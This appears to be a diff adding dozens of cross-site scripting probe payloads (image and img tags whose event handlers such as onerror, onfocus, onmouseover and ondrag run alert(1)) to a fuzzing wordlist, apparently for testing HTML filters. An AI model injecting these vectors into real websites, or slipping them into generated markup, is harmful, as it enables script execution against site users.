@@ -111,3 +111,80 @@
 <IMG SRC="jav ascript:alert('XSS');">
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<image draggable="true" ondrag="alert(1)">test</image>
+<image draggable="true" ondragend="alert(1)">test</image>
+<image draggable="true" ondragenter="alert(1)">test</image>
+<image draggable="true" ondragleave="alert(1)">test</image>
+<image draggable="true" ondragstart="alert(1)">test</image>
+<image id=x tabindex=1 onactivate=alert(1)></image>
+<image id=x tabindex=1 onbeforeactivate=alert(1)></image>
+<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>
+<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>
+<image id=x tabindex=1 onfocus=alert(1)></image>
+<image id=x tabindex=1 onfocusin=alert(1)></image>
+<image onbeforecopy="alert(1)" contenteditable>test</image>
+<image onbeforecut="alert(1)" contenteditable>test</image>
+<image onbeforepaste="alert(1)" contenteditable>test</image>
+<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>
+<image onclick="alert(1)">test</image>
+<image oncontextmenu="alert(1)">test</image>
+<image oncopy="alert(1)" contenteditable>test</image>
+<image oncut="alert(1)" contenteditable>test</image>
+<image ondblclick="alert(1)">test</image>
+<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
+<image onkeydown="alert(1)" contenteditable>test</image>
+<image onkeypress="alert(1)" contenteditable>test</image>
+<image onkeyup="alert(1)" contenteditable>test</image>
+<image onmousedown="alert(1)">test</image>
+<image onmouseenter="alert(1)">test</image>
+<image onmouseleave="alert(1)">test</image>
+<image onmousemove="alert(1)">test</image>
+<image onmouseout="alert(1)">test</image>
+<image onmouseover="alert(1)">test</image>
+<image onmouseup="alert(1)">test</image>
+<image onpaste="alert(1)" contenteditable>test</image>
+<image src/onerror=alert(1)>
+<image src=validimage.png onload=alert(1)>
+<image src=validimage.png onloadend=alert(1)>
+<image src=validimage.png onloadstart=alert(1)>
+<image srcset=1 onerror=alert(1)>
+<img draggable="true" ondrag="alert(1)">test</img>
+<img draggable="true" ondragend="alert(1)">test</img>
+<img draggable="true" ondragenter="alert(1)">test</img>
+<img draggable="true" ondragleave="alert(1)">test</img>
+<img draggable="true" ondragstart="alert(1)">test</img>
+<img id=x tabindex=1 onactivate=alert(1)></img>
+<img id=x tabindex=1 onbeforeactivate=alert(1)></img>
+<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
+<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>
+<img id=x tabindex=1 onfocus=alert(1)></img>
+<img id=x tabindex=1 onfocusin=alert(1)></img>
+<img onbeforecopy="alert(1)" contenteditable>test</img>
+<img onbeforecut="alert(1)" contenteditable>test</img>
+<img onbeforepaste="alert(1)" contenteditable>test</img>
+<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>
+<img onclick="alert(1)">test</img>
+<img oncontextmenu="alert(1)">test</img>
+<img oncopy="alert(1)" contenteditable>test</img>
+<img oncut="alert(1)" contenteditable>test</img>
+<img ondblclick="alert(1)">test</img>
+<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
+<img onkeydown="alert(1)" contenteditable>test</img>
+<img onkeypress="alert(1)" contenteditable>test</img>
+<img onkeyup="alert(1)" contenteditable>test</img>
+<img onmousedown="alert(1)">test</img>
+<img onmouseenter="alert(1)">test</img>
+<img onmouseleave="alert(1)">test</img>
+<img onmousemove="alert(1)">test</img>
+<img onmouseout="alert(1)">test</img>
+<img onmouseover="alert(1)">test</img>
+<img onmouseup="alert(1)">test</img>
+<img onpaste="alert(1)" contenteditable>test</img>
+<img src/onerror=alert(1)>
+<img src=validimage.png onload=alert(1)>
+<img src=validimage.png onloadend=alert(1)>
+<img src=validimage.png onloadstart=alert(1)>
+<img srcset=1 onerror=alert(1)>
+<img srcset=validimage.png onload=alert(1)>
+<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
+<img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
